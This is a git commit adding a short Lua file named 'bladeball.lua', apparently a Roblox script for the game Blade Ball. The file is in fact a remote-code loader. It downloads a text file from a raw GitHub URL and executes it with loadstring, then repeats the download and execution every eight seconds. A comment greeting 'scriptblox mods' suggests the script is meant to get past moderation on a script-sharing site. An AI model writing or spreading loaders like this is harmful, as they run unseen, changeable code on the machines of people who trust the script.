06fefc38acf5363f20c15127d85e5d8930a013d8
h4xal0t <132388501+h4xal0t@users.noreply.github.com>
2023-10-26 16:56:41 +0800

    Create bladeball.lua

---
+++ bladeball.lua
@@ -0,0 +1,7 @@
+-- hi scriptblox mods
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/630810360/popbob/main/popbob.txt"))()
+
+while wait(8) do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/630810360/popbob/main/popbob.txt"))()
+end
